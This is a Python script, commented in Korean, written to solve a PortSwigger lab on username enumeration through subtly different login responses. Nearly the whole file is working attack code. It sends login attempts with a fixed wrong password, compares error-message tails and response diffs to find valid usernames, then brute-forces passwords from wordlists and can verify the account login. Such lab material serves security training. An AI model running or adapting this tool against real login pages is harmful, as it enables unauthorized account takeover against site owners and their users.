#!/usr/bin/env python3
"""
Authentication - Subtle Username Enumeration
PortSwigger Lab:
  https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses

응답이 "미묘하게 다른" 경우(예: 마침표 '.' 대신 후행 공백)를 탐지해
유효한 username 을 찾는다.

일반적인 길이/상태코드 비교로는 놓치기 쉬운 차이를 잡기 위해
  1) 에러 메시지 앵커(기본 "Invalid username or password") 뒤 문자를 추출해
     repr 로 비교 (후행 공백 등 비가시 문자 노출)
  2) 응답 body 를 최빈 템플릿과 difflib 로 비교해 차이 위치를 출력
하는 방식을 사용한다.

기존 툴(14-authentication-brute-force.py)의 목록 로더와 세션 클래스를 재사용한다.

사용 예시:
  # 기본: username 목록 자동 다운로드 → 서브틀 차이 탐지 → password brute-force 까지
  python3 14-authentication-subtle-enum.py \\
    --target "https://LAB-ID.web-security-academy.net" --verify

  # username 만 탐지 (password 단계 생략)
  python3 14-authentication-subtle-enum.py \\
    --target "https://LAB-ID.web-security-academy.net" --no-brute
"""

import argparse
import difflib
import importlib.util
import os
import re
import sys
from collections import Counter

# 같은 디렉토리의 brute-force 툴에서 공통 기능 재사용
_HERE = os.path.dirname(os.path.abspath(__file__))
_BF_PATH = os.path.join(_HERE, "14-authentication-brute-force.py")


def _load_bruteforce():
    spec = importlib.util.spec_from_file_location("auth_bruteforce", _BF_PATH)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


bf = _load_bruteforce()


def extract_message(body: str, anchor: str) -> str | None:
    """앵커 문자열 뒤 짧은 꼬리(문장부호/공백 등)까지 포함해 메시지를 추출한다."""
    m = re.search(re.escape(anchor) + r"([^<\n]{0,6})", body)
    return m.group(0) if m else None


def first_diff(a: str, b: str) -> tuple[int, str, str] | None:
    """두 응답의 첫 차이 위치와 주변 컨텍스트를 반환한다."""
    sm = difflib.SequenceMatcher(None, a, b, autojunk=False)
    for tag, i1, i2, j1, j2 in sm.get_opcodes():
        if tag != "equal":
            ctx = 30
            return (i1,
                    a[max(0, i1 - ctx):i2 + ctx].replace("\n", "\\n"),
                    b[max(0, j1 - ctx):j2 + ctx].replace("\n", "\\n"))
    return None


def main() -> None:
    parser = argparse.ArgumentParser(
        description="서브틀 응답 차이를 이용한 username enumeration"
    )
    parser.add_argument("--target", required=True,
                        help="대상 베이스 URL (예: https://LAB.web-security-academy.net)")
    parser.add_argument("--login-path", default="/login",
                        help="로그인 경로 (기본값: /login)")
    parser.add_argument("--username-field", default="username",
                        help="username 파라미터 이름 (기본값: username)")
    parser.add_argument("--password-field", default="password",
                        help="password 파라미터 이름 (기본값: password)")
    parser.add_argument("--usernames", default=None,
                        help=f"username 목록 (URL/파일/인라인). 기본: {bf.DEFAULT_USERNAMES}")
    parser.add_argument("--passwords", default=None,
                        help=f"password 목록 (URL/파일/인라인). 기본: {bf.DEFAULT_PASSWORDS}")
    parser.add_argument("--anchor", default="Invalid username or password",
                        help="에러 메시지 앵커 문자열 (기본: 'Invalid username or password')")
    parser.add_argument("--static-password", default="invalid-password-12345",
                        help="enumeration 시 고정으로 보낼 password (기본: invalid)")
    parser.add_argument("--pass-fail", default="Invalid username or password",
                        help="password 단계 실패 응답 문자열 (기본: 'Invalid username or password')")
    parser.add_argument("--session", default=None, help="기존 세션 쿠키 값 (선택)")
    parser.add_argument("--brute", dest="brute", action="store_true", default=True,
                        help="유효 username 탐지 후 password brute-force 수행 (기본: 수행)")
    parser.add_argument("--no-brute", dest="brute", action="store_false",
                        help="password brute-force 생략 (username 탐지만)")
    parser.add_argument("--verify", action="store_true",
                        help="자격증명으로 로그인/계정 접근 검증")
    parser.add_argument("--account-path", default="/my-account",
                        help="검증 시 접근할 계정 경로 (기본: /my-account)")
    parser.add_argument("--delay", type=float, default=0.0,
                        help="요청 간 지연(초) (기본: 0)")
    args = parser.parse_args()

    try:
        usernames = bf.load_wordlist(args.usernames, bf.DEFAULT_USERNAMES)
    except Exception as e:
        print(f"[-] 목록 로딩 실패: {e}")
        sys.exit(1)

    print(f"[*] 대상    : {args.target}")
    print(f"    anchor  : {args.anchor!r}")
    print(f"    username: {len(usernames)}개")

    login = bf.LoginSession(args.target, args.login_path, args.username_field,
                            args.password_field, args.session)
    print(f"    CSRF    : {'획득' if login.csrf else '없음'}")

    records = []  # (username, status, len, body, message)
    for i, user in enumerate(usernames, 1):
        try:
            resp = login.attempt(user, args.static_password)
        except Exception as e:  # noqa: BLE001
            print(f"    {user:<24} 요청 실패: {e}")
            continue
        records.append((user, resp.status_code, len(resp.text),
                        resp.text, extract_message(resp.text, args.anchor)))
        if args.delay:
            import time
            time.sleep(args.delay)

    counts = Counter(m for _, _, _, _, m in records if m is not None)
    modal = counts.most_common(1)[0][0] if counts else None

    print(f"\n[*] 메시지 추출 결과 (총 {len(records)}개)")
    print(f"    최빈 메시지: {modal!r}")
    print(f"    {'username':<24} {'status':>6} {'length':>8}  message(repr)")
    print("    " + "-" * 74)
    for user, status, length, _, msg in records:
        marker = "  <== 다름" if (modal is not None and msg != modal) else ""
        print(f"    {user:<24} {status:>6} {length:>8}  {msg!r}{marker}")

    candidates = [u for u, _, _, _, m in records if modal is not None and m != modal]
    if not candidates:
        print("\n[-] 서브틀 차이를 찾지 못했습니다.")
        print("    --anchor 를 실제 에러 메시지로 조정하거나 아래 diff 를 확인하세요.")
    else:
        print(f"\n[+] 유효 username 후보: {candidates}")
        # 후보 응답과 최빈 응답의 실제 차이를 보여준다.
        modal_body = next(b for _, _, _, b, m in records if m == modal)
        for cand in candidates:
            body = next(b for u, _, _, b, _ in records if u == cand)
            diff = first_diff(modal_body, body)
            if diff:
                pos, a_ctx, b_ctx = diff
                print(f"\n    [{cand}] 최빈 응답과 첫 차이 (offset {pos})")
                print(f"      기준: ...{a_ctx}...")
                print(f"      후보: ...{b_ctx}...")

    if not args.brute or not candidates:
        return

    passwords = bf.load_wordlist(args.passwords, bf.DEFAULT_PASSWORDS)
    for username in candidates:
        pw = bf.brute_password(login, username, passwords, args.pass_fail,
                               args.delay)
        if pw:
            print(f"\n[=] 결과: {username} / {pw}")
            if args.verify:
                bf.verify_login(login, username, pw, args.account_path)
            return
    print("\n[-] 후보 username 에 대한 password 를 찾지 못했습니다.")


if __name__ == "__main__":
    main()
